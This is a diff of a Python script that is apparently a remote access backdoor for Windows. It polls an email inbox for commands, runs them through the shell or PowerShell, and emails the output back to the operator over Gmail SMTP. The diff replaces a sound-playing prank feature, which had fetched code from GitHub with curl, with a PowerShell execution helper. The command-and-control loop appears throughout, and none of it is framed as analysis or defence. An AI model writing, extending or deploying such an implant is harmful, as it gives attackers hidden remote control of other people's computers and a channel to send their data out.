@@ -8,17 +8,6 @@ import time
 import subprocess as sp
 import winreg as reg
 import getpass
-try:
-    from playsound import playsound
-except:
-    os.system("curl https://raw.githubusercontent.com/ivertheboss/Photon-Unity/main/GameFolder/MonoBleedingEdge/EmbedRuntime/playsound.py -o playsound.py")
-    from playsound import playsound
-import threading
-
-thread = ""
-
-def play(sound):
-    playsound(sound)
 
 USER_NAME = getpass.getuser()
 
@@ -64,6 +53,10 @@ count = 0
 
 print("AWAITING COMMAND...")
 
+def run(cmd):
+    completed = sp.run(["powershell", "-Command", cmd], capture_output=True)
+    return completed
+
 while True:
     time.sleep(0.1)
     # Define email sender and receiver
@@ -73,94 +66,64 @@ while True:
 
     try:
         command = get_inbox()[0]['body']
-        if command[0:9] == "stopsound":
-            try:
-                thread.terminate()
-                subject = 'CMD'
-                body = "SOUND STOPPED"
-                em = EmailMessage()
-                em['From'] = email_sender
-                em['To'] = email_receiver
-                em['Subject'] = subject
-                em.set_content(body)
-                context = ssl.create_default_context()
-                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-                    smtp.login(email_sender, email_password)
-                    smtp.sendmail(email_sender, email_receiver, em.as_string())
-            except:
-                subject = 'CMD'
-                body = "NO SOUNDS PLAYING"
-                em = EmailMessage()
-                em['From'] = email_sender
-                em['To'] = email_receiver
-                em['Subject'] = subject
-                em.set_content(body)
-                context = ssl.create_default_context()
-                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-                    smtp.login(email_sender, email_password)
-                    smtp.sendmail(email_sender, email_receiver, em.as_string())
-        if command[0:9] == "playsound":
-            try:
-                thread = threading.Thread(target=play, args=(command.partition(' ')[2],))
-                thread.start()
-                subject = 'CMD'
-                body = "PLAYING SOUND (deviously)"
-                em = EmailMessage()
-                em['From'] = email_sender
-                em['To'] = email_receiver
-                em['Subject'] = subject
-                em.set_content(body)
-                context = ssl.create_default_context()
-                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-                    smtp.login(email_sender, email_password)
-                    smtp.sendmail(email_sender, email_receiver, em.as_string())
-            except:
-                subject = 'CMD'
-                body = "COULD NOT FIND FILE"
-                em = EmailMessage()
-                em['From'] = email_sender
-                em['To'] = email_receiver
-                em['Subject'] = subject
-                em.set_content(body)
-                context = ssl.create_default_context()
-                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-                    smtp.login(email_sender, email_password)
-                    smtp.sendmail(email_sender, email_receiver, em.as_string())
         print("COMMAND RECEIVED...")
         print("EXECUTING COMMAND...")
-        subject = 'CMD'
-        body = ""
-        result = ""
-        error = ""
-        try:
-            result = str(sp.getoutput(command))
-            body = f"""COMMAND SUCCESSFUL:
+        if command[0] == "p":
+            try:
+                hello_command = command.partition("p ")[2]
+                subject = 'CMD'
+                body = f"""COMMAND SUCCESSFUL:
+                        \n""" + str(run(hello_command)) + """"""
+                em = EmailMessage()
+                em['From'] = email_sender
+                em['To'] = email_receiver
+                em['Subject'] = subject
+                em.set_content(body)
+                # Add SSL (layer of security)
+                context = ssl.create_default_context()
+                print("COMMAND EXECUTED...")
+                print("SENDING CONFORMATION...")
+                with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                    smtp.login(email_sender, email_password)
+                    smtp.sendmail(email_sender, email_receiver, em.as_string())
+                print("CONFORMATION SENT...")
+                print("RESETTING DATA...")
+                time.sleep(2)
+                print("DATA RESET DONE...")
+                print("AWAITING COMMAND...")
+            except e:
+                print(e)
+        else:
+            subject = 'CMD'
+            body = ""
+            result = ""
+            error = ""
+            try:
+                result = str(sp.getoutput(command))
+                body = f"""COMMAND SUCCESSFUL:
                                     \n""" + result + """
                                     """
-        except e:
-            error = e
-            body = f"""COMMAND UNSUCCESSFUL:
+            except e:
+                error = e
+                body = f"""COMMAND FAILED:
                         \n""" + error + """
                         """
-
-        em = EmailMessage()
-        em['From'] = email_sender
-        em['To'] = email_receiver
-        em['Subject'] = subject
-        em.set_content(body)
-
-        # Add SSL (layer of security)
-        context = ssl.create_default_context()
-        print("COMMAND EXECUTED...")
-
-        print("SENDING CONFORMATION...")
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-            smtp.login(email_sender, email_password)
-            smtp.sendmail(email_sender, email_receiver, em.as_string())
-        print("CONFORMATION SENT...")
-        print("RESETTING DATA...")
-        time.sleep(2)
-        print("DATA RESET DONE...")
-        print("AWAITING COMMAND...")
+            em = EmailMessage()
+            em['From'] = email_sender
+            em['To'] = email_receiver
+            em['Subject'] = subject
+            em.set_content(body)
+            # Add SSL (layer of security)
+            context = ssl.create_default_context()
+            print("COMMAND EXECUTED...")
+            print("SENDING CONFORMATION...")
+            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+                smtp.login(email_sender, email_password)
+                smtp.sendmail(email_sender, email_receiver, em.as_string())
+            print("CONFORMATION SENT...")
+            print("RESETTING DATA...")
+            time.sleep(2)
+            print("DATA RESET DONE...")
+            print("AWAITING COMMAND...")
     except:
         pass
